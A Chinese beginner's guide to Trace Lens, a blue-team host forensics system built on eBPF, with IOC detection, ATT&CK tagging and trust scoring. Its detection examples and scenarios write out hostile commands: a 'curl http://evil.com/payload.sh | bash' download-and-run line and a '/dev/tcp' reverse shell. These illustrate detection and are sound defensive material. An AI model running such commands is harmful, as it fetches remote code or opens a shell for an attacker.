# Trace Lens 溯源系统 — 小白入门指南

## 一、这是什么？

**Trace Lens** 是一套运行在单台 Ubuntu 24.04 主机上的**蓝队溯源与调查系统**。

通俗理解：它就像一台"安全摄像头"，持续记录主机上发生的所有进程活动、文件操作、网络连接和 DNS 请求，然后帮你把这些碎片拼成完整的攻击故事——谁入侵了、怎么进来的、干了什么、影响了哪些文件。

核心能力：

1. **采集**：通过 eBPF（一种内核级的传感器技术，无需改动内核即可监听系统调用）捕获所有进程行为
2. **关联**：把分散的事件拼成完整的事件链（进程血缘关系、文件传播链、网络行为链）
3. **检测**：IOC（入侵指标）匹配、ATT&CK 战术标注、进程可信度评分、DNS 域名熵值检测
4. **Ring0 完整性检查**：检测内核是否被篡改、是否存在隐藏进程、eBPF 异常等
5. **可视化和导出**：Web UI 查看 + Markdown/JSON 报告导出

---

## 二、系统架构全景图

```
 ┌──────────────────────────────────────────────────────────────┐
 │                    Tracee (eBPF 传感器)                        │
 │         捕获系统调用，输出 NDJSON 格式的事件流                    │
 └──────────────────────────┬───────────────────────────────────┘
                            │
                            ▼
 ┌──────────────────────────────────────────────────────────────┐
 │                  采集层 (collector/)                           │
 │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐            │
 │  │ tracee.rs   │  │  ring0.rs   │  │ canary.rs   │            │
 │  │ Tracee 解析  │  │ 内核完整性   │  │蜜罐文件/端口 │            │
 │  └─────────────┘  └─────────────┘  └─────────────┘            │
 └──────────────────────────┬───────────────────────────────────┘
                            │
                            ▼
 ┌──────────────────────────────────────────────────────────────┐
 │                  存储层 (storage/)                             │
 │  ┌─────────────────────────────────────────────────┐          │
 │  │            SQLite 数据库 (14 张表)                │          │
 │  │  raw_events │ processes │ file_events │ ...      │          │
 │  └─────────────────────────────────────────────────┘          │
 └──────────────────────────┬───────────────────────────────────┘
                            │
                            ▼
 ┌──────────────────────────────────────────────────────────────┐
 │                  分析引擎 (engine/)                            │
 │  ┌────────────┐ ┌──────────┐ ┌────────┐ ┌────────┐           │
 │  │ proc_tree  │ │incident  │ │ trust  │ │  ioc   │           │
 │  │ 进程血缘树  │ │事件聚合   │ │可信度   │ │IOC检测 │           │
 │  └────────────┘ └──────────┘ └────────┘ └────────┘           │
 └──────────────────────────┬───────────────────────────────────┘
                            │
              ┌─────────────┴─────────────┐
              ▼                           ▼
 ┌──────────────────────┐   ┌──────────────────────────┐
 │   CLI 命令行工具       │   │   API + Web UI           │
 │   trace-lens proc     │   │   http://localhost:24680  │
 │   trace-lens incident │   │   仪表板 / 事件图 / 报告   │
 │   trace-lens export   │   │                           │
 └──────────────────────┘   └──────────────────────────┘
```

---

## 三、目录结构说明

```
traces/
├── src/                    # Rust 源代码
│   ├── main.rs             # 程序入口
│   ├── app.rs              # 所有 CLI 命令的实现
│   ├── cli/                # 命令行参数定义 (clap)
│   ├── model/               # 数据模型
│   │   ├── event.rs        # 原始事件 / 标准化事件
│   │   ├── process.rs      # 进程节点
│   │   ├── ring0.rs        # 内核检查发现
│   │   ├── edr.rs          # EDR 事件/告警
│   │   └── incident.rs     # 事件聚合结果
│   ├── collector/          # 采集器
│   │   ├── tracee.rs       # Tracee 事件解析与入库
│   │   ├── ring0.rs        # 内核完整性检查
│   │   └── canary.rs       # 蜜罐文件与幽灵端口
│   ├── storage/
│   │   └── sqlite.rs       # 所有数据库操作 (初始化/插入/查询)
│   ├── engine/             # 分析引擎
│   │   ├── proc_tree.rs    # 进程血缘树构建
│   │   ├── incident.rs     # 事件聚合 (含评分、Mermaid 图)
│   │   ├── trust.rs        # 可信度打分
│   │   └── ioc.rs          # IOC 匹配与 ATT&CK 标注
│   ├── connectors/         # EDR 适配器
│   │   ├── traits.rs       # EDR 适配器接口定义
│   │   └── edr/
│   │       └── webhook.rs  # 通用 Webhook 适配器
│   └── api/                # HTTP 服务器
│       ├── server.rs       # Axum 路由、API 处理器、HTML 模板
│       └── edr_ingest.rs   # EDR 数据接收端点
│
├── web/                    # Web 前端 (HTML + 原生 JS)
│   ├── templates/          # 页面模板 (index, incident, ring0, edr, net, file)
│   └── static/
│       ├── app.css         # 样式 (支持暗色/亮色主题)
│       ├── dashboard.js    # 事件列表
│       ├── incident.js     # 事件详情 + Mermaid 图渲染
│       ├── ring0.js        # 内核检查结果
│       ├── edr.js          # EDR 集成
│       ├── net.js          # 网络查找
│       ├── file.js         # 文件查找 + 传播链
│       └── theme.js        # 主题切换
│
├── configs/                # 配置文件
│   ├── tracee-policy.yaml  # Tracee 策略 (定义捕获哪些事件)
│   ├── edr-mapping.yaml    # EDR 适配器映射
│   ├── profiles.yaml       # 运行模式 (light/full/deep)
│   └── watch_paths.yaml    # 敏感文件路径 (用于 IOC 检测)
│
├── db/
│   ├── schema.sql          # 数据库完整建表 SQL
│   └── trace-lens.db       # 默认数据库文件
│
├── scripts/                # 部署/测试脚本
│   ├── install.sh          # 系统依赖安装
│   ├── install-tracee.sh   # Tracee 二进制安装
│   ├── run-tracee-live.sh  # 一键启动采集 + 入库
│   └── validate-*.sh       # 7 个攻击场景验证脚本
│
├── systemd/                # systemd 服务单元
│   ├── trace-lens.service  # trace-lens 服务
│   └── tracee.service      # Tracee 传感器服务
│
├── runtime/                # 运行时输出 (报告、导出文件)
├── docs/                   # 文档 (README, API, 作战手册)
├── samples/                # 样本数据
├── Cargo.toml              # Rust 项目配置
├── Goal.md                 # 项目目标与里程碑
└── Todo.md                 # 任务清单 (几乎全部完成)
```

---

## 四、核心数据模型

### 4.1 RawEvent — 原始事件

所有采集到的原始事件的统一格式：

```rust
RawEvent {
    id:             u64,          // 自增 ID
    source_kind:    "tracee",     // 来源类型: "tracee" 或 "edr"
    source_name:    "tracee-v0.30", // 来源名称
    event_name:     "sched_process_exec", // 事件类型名
    observed_at:    1700000000,   // 发生时间戳
    host_id:        "blue-01",    // 主机标识
    hostname:       "ubuntu",     // 主机名
    process_key:    "pid/ts",     // 进程唯一键
    severity:       5,            // 严重程度 (1-10)
    payload_json:   "{...}",      // 原始 JSON 数据
    ingest_method:  "file",       // 入库方式
    created_at:     1700000001,   // 入库时间
}
```

Tracee 捕获的 6 种事件类型：
| 事件名 | 含义 | 示例 |
|--------|------|------|
| `sched_process_exec` | 程序执行 | `/usr/bin/curl http://evil.com` |
| `sched_process_fork` | 进程分叉 | bash 启动子进程 |
| `sched_process_exit` | 进程退出 | curl 下载完成退出 |
| `security_file_open` | 文件打开 | 打开 `/etc/crontab` |
| `net_tcp_connect` | TCP 连接 | 连接 10.0.0.5:4444 |
| `net_packet_dns_request` | DNS 请求 | 查询 evil.com |

### 4.2 NormalizedEvent — 标准化事件

将不同 EDR 厂商的数据统一成 33 个字段的标准格式：

关键字段：
- **身份信息**：`pid`, `ppid`, `uid`, `user_name`
- **执行信息**：`exe_path`, `cmdline`, `cwd`
- **文件信息**：`file_path`, `file_hash`
- **网络信息**：`src_ip`, `src_port`, `dst_ip`, `dst_port`, `protocol`
- **严重程度**：`severity` (1-10), `confidence` (0-100)

### 4.3 ProcessNode — 进程节点

每个进程的生命周期记录：

```rust
ProcessNode {
    process_key:       "12345/1700000000",  // 唯一键 = PID/启动时间
    pid:               12345,
    ppid:              1000,                // 父进程 PID
    process_guid:      "a1b2c3d4",         // 进程全局 ID
    parent_process_key: "1000/1699000000",  // 父进程键
    exe_path:          "/usr/bin/bash",
    comm:              "bash",              // 进程短名称
    cmdline:           "bash -i",           // 完整命令行
    cwd:               "/root",
    uid:               0,                   // 用户 ID
    start_time:        1700000000,          // 启动时间
    exit_time:         None,                // 退出时间 (运行中则为空)
    trust_score:       5,                   // 可信度分数 (5-100)
    trust_reasons_json: "",                 // 可信度理由
}
```

### 4.4 Incident — 事件聚合

对某个进程进行全方位分析后产出的报告：

```rust
Incident {
    role:             "attacker-tool", // 角色分类
    severity:         9,               // 整体严重程度 (1-10)
    confidence:       0.9,             // 置信度 (0.0-1.0)
    tactic_tags:      ["execution","persistence","c2"], // ATT&CK 战术
    first_seen:       1700000000,      // 首次出现
    last_seen:        1700000010,      // 最后出现
    event_counts:     {exec: 3, file: 5, net: 2, dns: 1}, // 各类事件数
    trust_score:      5,               // 可信度
    host_trust:       "L0",            // 主机可信度级别
    process_graph:    "graph TD;...",  // Mermaid 进程图
}
```

---

## 五、数据流转全过程

### 第 1 步：采集原始事件

```
[启动 Tracee]
  $ sudo ./tracee --policy configs/tracee-policy.yaml --output json:events.ndjson

[Tracee 输出 NDJSON]
  每行一个 JSON 事件，持续写入 events.ndjson 文件
```

### 第 2 步：解析并入库

```
[运行入库命令]
  $ trace-lens tracee ingest --input events.ndjson

[处理流程]
  逐行读取 NDJSON → 解析为 RawEvent → 计算严重程度 → 批量写入 SQLite
```

### 第 3 步：Ring0 内核检查 (并行)

```
[定时或手动触发]
  kernel checks:  检查内核是否被污染 (tainted)
  proc checks:    比较 /proc 和 ps 命令看到的进程数
  net checks:     比较 ss 和 netstat 看到的监听端口数
  ebpf checks:    用 bpftool 列出所有 eBPF 程序，检测异常
  unhide checks:  用 unhide 工具检测隐藏进程
  蜜罐检查:      检查蜜罐文件是否被触碰、幽灵端口是否被连接
```

### 第 4 步：进程血缘树构建

```
[触发: trace-lens proc 12345]

1. 查询 PID 12345 的所有 fork/exec/exit 事件
2. 构建父子关系: 12345 ← 父进程 1000 ← 祖父进程 1 (systemd)
3. 找到所有子进程、孙进程...
4. 关联所有相关文件操作、网络连接、DNS 查询
```

### 第 5 步：事件聚合分析

```
[触发: trace-lens incident 12345]

1. 构建进程树 (祖先 16 级 + 后代 64 级)
2. 收集该树内所有 PIDs 的文件/网络/DNS 事件
3. 查询 EDR 数据库中的相关证据
4. IOC 检测:
   ┌─ 命令行特征: curl ... | bash, bash -i, /dev/tcp/...
   ├─ 敏感文件访问: /etc/passwd, /etc/shadow, crontab
   ├─ 持久化路径: /etc/systemd/system/, ~/.bashrc
   ├─ 横向移动迹象: SSH 连接内网 IP
   └─ DNS 域名熵值: 高熵值域名 (如 a7x9b.example.com)
5. ATT&CK 战术标注: Initial Access, Execution, Persistence, C2 等
6. 可信度评分:
   ├─ 进程可信度 (5-100): 基于路径、UID、命令行
   └─ 主机可信度 (L0-L3): L0=干净, L3=已失陷
7. 严重程度 1-10 和置信度 0.0-0.95
8. 生成 Mermaid 进程图
```

### 第 6 步：呈现与导出

```
[CLI 查看]
  trace-lens proc 12345              # 进程详情
  trace-lens incident 12345          # 事件聚合结果
  trace-lens incident 12345 --json   # JSON 格式

[Web 查看]
  浏览器打开 http://localhost:24680
  仪表板 → 点击事件 → 查看详情、进程图、EDR 证据

[导出报告]
  trace-lens export --pid 12345 --format report     # Markdown 报告
  trace-lens export --pid 12345 --format timeline   # JSON 时间线
  trace-lens export --pid 12345 --format package    # 完整取证包
```

---

## 六、核心分析能力

### 6.1 进程血缘追踪

```
例：攻击者通过 SSH 登录，运行 curl|bash 下载后门

  systemd (1)                 # 系统 init
    └── sshd (4567)           # SSH 服务
        └── bash (5000)       # 攻击者 shell
            └── curl (5001)   # 下载 payload
                └── bash (5002)  # 执行 payload (curl|bash 中的 bash)
                    └── backdoor (5003)  # 后门进程
                        └── bash -i (5004)  # 反向 shell
```

系统能自动追踪这整条链条，识别每个节点的父子关系。

### 6.2 文件传播链

```
例：一个恶意文件被写入、拷贝、执行

  /tmp/malware.elf      ← 被进程 A 写入
    → /tmp/.hidden.elf  ← 被进程 B 拷贝
      → 被进程 C 执行   ← 生成新进程
        → /etc/systemd/system/backdoor.service ← 写入持久化
```

### 6.3 IOC 检测矩阵

| 检测类别 | 检测内容 | 示例 |
|---------|---------|------|
| 命令行特征 | 反弹 shell 模式 | `bash -i >& /dev/tcp/...` |
| 敏感文件 | 关键系统文件访问 | `/etc/shadow`, `/etc/passwd` |
| 持久化路径 | 启动项路径写入 | `crontab`, `systemd service`, `.bashrc` |
| 横向移动 | 内网 IP 连接 | SSH 到 192.168.x.x |
| DNS 熵值 | 高熵域名检测 | `a7b3x9.example.com` (疑似 DGA) |
| 进程信任 | 低可信度文件执行 | `/dev/shm/xxx`, `/tmp/.hidden` |

### 6.4 ATT&CK 战术标注

| 战术 | 中文 | 触发条件 |
|------|------|---------|
| Initial Access | 初始入侵 | SSH 登录后的异常行为 |
| Execution | 执行 | curl\|bash, 脚本执行 |
| Persistence | 持久化 | crontab/systemd 写入 |
| Privilege Escalation | 提权 | sudo/su 痕迹 |
| Defense Evasion | 防御规避 | 文件隐藏、进程隐藏 |
| Lateral Movement | 横向移动 | 内网 SSH 连接 |
| Command and Control | C2 通信 | 反弹 shell, Beacon 流量 |
| Exfiltration | 数据窃取 | 大量外发网络连接 |

### 6.5 信任度模型

**进程可信度** (5-100)：
- 高可信 (80-100)：`/usr/bin/`, `/bin/`, systemd 自有进程
- 中可信 (40-79)：用户安装软件、脚本
- 低可信 (5-39)：`/tmp/`, `/dev/shm/`, 隐藏目录下的可执行文件

**主机可信度** (L0-L3)：
- **L0**：系统干净，内核无异常
- **L1**：轻微异常（如某些内核模块加载）
- **L2**：明显异常（进程/网络计数不匹配）
- **L3**：已确认为失陷（隐藏进程、内核污染、eBPF 异常）

---

## 七、SQLite 数据库

### 7.1 表结构 (14 张表)

| 表名 | 用途 | 关键索引 |
|------|------|---------|
| `schema_meta` | 数据库版本 | key |
| `raw_events` | 所有原始事件 | observed_at, source_kind, host_id, process_key |
| `normalized_events` | EDR 标准化事件 | pid, observed_at |
| `processes` | 进程节点 | pid, ppid, start_time, process_guid |
| `process_edges` | 进程父子关系 | parent_process_key, child_process_key |
| `file_events` | 文件事件 | file_path, pid |
| `network_events` | 网络事件 | dst_ip, src_port, pid |
| `incidents` | 事件聚合结果 | pid, severity |
| `ioc_hits` | IOC 命中记录 | ioc_type, pid |
| `ring0_findings` | 内核检查发现 | finding_type, severity |
| `edr_events` | EDR 事件 | pid, process_guid |
| `edr_alerts` | EDR 告警 | pid, process_guid |
| `reports` | 导出报告 | incident_id |
| `integration_jobs` | EDR 集成任务 | adapter_name |

### 7.2 如何查询数据库

```bash
# 直接连接 SQLite
sqlite3 db/trace-lens.db

# 查看最近 10 条原始事件
SELECT * FROM raw_events ORDER BY observed_at DESC LIMIT 10;

# 查看所有进程
SELECT pid, ppid, exe_path, cmdline, start_time FROM processes;

# 查看所有文件事件
SELECT pid, file_path, observed_at FROM file_events;

# 查看内核检查结果
SELECT finding_type, severity, summary FROM ring0_findings;
```

---

## 八、Web 界面

### 8.1 页面路由

| URL | 页面 | 功能 |
|-----|------|------|
| `/` | 仪表板 | 事件列表，支持严重程度/可信度筛选 |
| `/incident/{pid}` | 事件详情 | 进程树图、事件表格、EDR 证据、DNS 查询 |
| `/ring0` | 内核完整性 | 内核检查发现列表 |
| `/edr` | EDR 集成 | EDR 事件/告警列表 |
| `/net` | 网络查找 | 按 IP/端口搜索网络事件 |
| `/file` | 文件查找 | 按路径搜索文件事件 + 传播链 |

### 8.2 启动 Web 服务

```bash
# 仅启动 HTTP 服务
trace-lens serve

# 启动服务 + 定时 Ring0 检查 (每 60 秒)
trace-lens serve --ring0 --ring0-interval 60

# 设置认证 token
export TRACE_LENS_API_TOKEN="your-secret"
trace-lens serve

# 指定端口
trace-lens serve --port 24680 --host 0.0.0.0
```

浏览器打开 `http://localhost:24680` 即可访问。

---

## 九、API 接口

### 9.1 核心 API

```bash
# 查看系统状态
GET  /api/v1/status

# 查看最近事件
GET  /api/v1/events

# 查看事件列表
GET  /api/v1/incidents

# 查看某个 PID 的事件详情
GET  /api/v1/incidents/{pid}

# 查看进程详情 (含文件/网络/DNS/可信度)
GET  /api/v1/proc/{pid}

# 网络查找
GET  /api/v1/net/{target}         # target = IP 或 IP:port

# 文件查找
GET  /api/v1/file?path=/etc/passwd

# 文件传播链
GET  /api/v1/file-chain?path=/tmp/malware

# Ring0 检查结果
GET  /api/v1/ring0

# EDR 事件
GET  /api/v1/edr/events
```

### 9.2 调用示例

```bash
# 用 curl 调用 API
curl http://localhost:24680/api/v1/status

# 带 token 认证
curl -H "x-trace-lens-token: your-secret" http://localhost:24680/api/v1/incidents

# 查看 PID 45231 的事件详情
curl http://localhost:24680/api/v1/incidents/45231

# 搜索 192.168.1.100 相关的网络事件
curl http://localhost:24680/api/v1/net/192.168.1.100
```

---

## 十、实战场景

### 场景 1：反弹 Shell 检测

```
攻击行为: 攻击者在主机上执行 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

Tracee 捕获:
  1. sched_process_exec: bash 启动 (检测到 cmdline 包含 /dev/tcp)
  2. net_tcp_connect: 连接到 10.0.0.1:4444

分析结果:
  - IOC: [反弹shell] cmdline 包含 /dev/tcp/
  - ATT&CK: Execution, Command and Control
  - 严重程度: 9
  - 进程可信度: 15 (低)
```

### 场景 2：curl 管道攻击

```
攻击行为: curl http://evil.com/payload.sh | bash

Tracee 捕获:
  1. sched_process_exec: curl 启动
  2. net_tcp_connect: curl 连接 evil.com
  3. net_packet_dns_request: DNS 查询 evil.com
  4. sched_process_exec: bash 启动 (检测到 curl|bash 模式)

分析结果:
  - IOC: [curl管道] cmdline 包含 curl...|bash
  - ATT&CK: Execution
  - 严重程度: 8
  - DNS 域名可能触发高熵检测
```

### 场景 3：持久化后门

```
攻击行为: 写入 crontab 或 systemd service

Tracee 捕获:
  security_file_open: 打开 /etc/crontab
  security_file_open: 打开 /etc/systemd/system/backdoor.service

Ring0 检查:
  蜜罐文件是否被触碰

分析结果:
  - IOC: [持久化] 修改 crontab
  - IOC: [持久化] 创建 systemd service
  - ATT&CK: Persistence
  - 文件传播链: 哪个进程写入的 → 后续影响
```

---

## 十一、部署与运行

### 11.1 快速上手

```bash
# 1. 安装系统依赖
sudo bash scripts/install.sh

# 2. 安装 Tracee
sudo bash scripts/install-tracee.sh

# 3. 编译 trace-lens
cargo build --release

# 4. 初始化数据库
./target/release/trace-lens init-db

# 5. 实时采集 (一键)
sudo bash scripts/run-tracee-live.sh

# 6. 启动 Web 界面
./target/release/trace-lens serve

# 7. 浏览器打开 http://localhost:24680
```

### 11.2 使用 systemd 持久运行

```bash
# 复制服务文件
sudo cp systemd/trace-lens.service /etc/systemd/system/
sudo cp systemd/tracee.service /etc/systemd/system/

# 启用并启动
sudo systemctl enable trace-lens tracee
sudo systemctl start trace-lens tracee

# 查看状态
sudo systemctl status trace-lens
journalctl -u trace-lens -f
```

---

## 十二、技术栈速览

| 分类 | 技术 | 说明 |
|------|------|------|
| 编程语言 | Rust (edition 2024) | 全部应用逻辑 |
| 异步运行时 | Tokio | HTTP 服务 + 定时任务 |
| HTTP 框架 | Axum | REST API 和静态文件 |
| 命令行 | Clap (derive) | 所有 CLI 参数 |
| 数据库 | SQLite (rusqlite) | 嵌入式关系型数据库 |
| 序列化 | Serde + serde_json | JSON 解析和序列化 |
| 日志 | Tracing | 结构化日志 |
| 传感器 | Tracee (eBPF) | 内核级系统调用捕获 |
| 前端 | HTML + 原生 JS + Mermaid.js | Web 界面 + 进程图 |
| 外部工具 | bpftool, unhide, ss, netstat | Ring0 完整性检查 |
| 部署 | systemd | 服务守护 |

---

## 十三、核心概念速记

| 概念 | 一句话解释 |
|------|-----------|
| eBPF | 内核中的安全虚拟机，无需改内核就能监听系统行为 |
| NDJSON | 每行一个 JSON 的数据格式，适合流式处理 |
| 进程血缘 | 进程的父子关系，形成一棵树 |
| IOC | 入侵指标，如恶意命令行、异常域名 |
| ATT&CK | MITRE 的攻击行为知识库框架 |
| Ring0 (内核态) | 操作系统最底层，这里的问题最严重 |
| DGA | 域名生成算法，恶意软件用来生成 C2 域名 |
| C2 | Command & Control，攻击者的远程控制通道 |
| 熵值 | 字符串的随机程度，正常域名有含义，恶意域名是乱码 |

---

## 附录：常用命令速查

```bash
# === 数据库 ===
trace-lens init-db                        # 初始化数据库
trace-lens status                         # 查看数据库状态
trace-lens events                         # 列出最近事件

# === 采集 ===
trace-lens tracee plan                    # 查看 Tracee 运行说明
trace-lens tracee ingest --input events.ndjson  # 导入 Tracee 事件

# === Ring0 ===
trace-lens ring0 check                    # 运行内核检查
trace-lens ring0 findings                 # 查看检查结果

# === 分析 ===
trace-lens proc <PID>                     # 进程详情
trace-lens proc <PID> --descendants       # 进程详情 + 子进程
trace-lens incident <PID>                 # 事件聚合
trace-lens incident <PID> --json          # JSON 格式输出
trace-lens net <IP>                       # 网络查找
trace-lens file <PATH>                    # 文件查找
trace-lens file <PATH> --chain            # 文件传播链

# === EDR 蜜罐 ===
trace-lens canary setup                   # 创建蜜罐文件和幽灵端口
trace-lens canary check                   # 检查蜜罐状态

# === 导出 ===
trace-lens export --pid <PID> --format report    # Markdown 报告
trace-lens export --pid <PID> --format timeline  # JSON 时间线
trace-lens export --pid <PID> --format package   # 完整取证包

# === 服务 ===
trace-lens serve                          # 启动 Web 服务
trace-lens serve --ring0 --ring0-interval 60  # 启动 + 定时检查
```

---

> 本文档基于 Trace Lens Phase 1 (单机版) 编写，系统状态：M5 (可交付)。
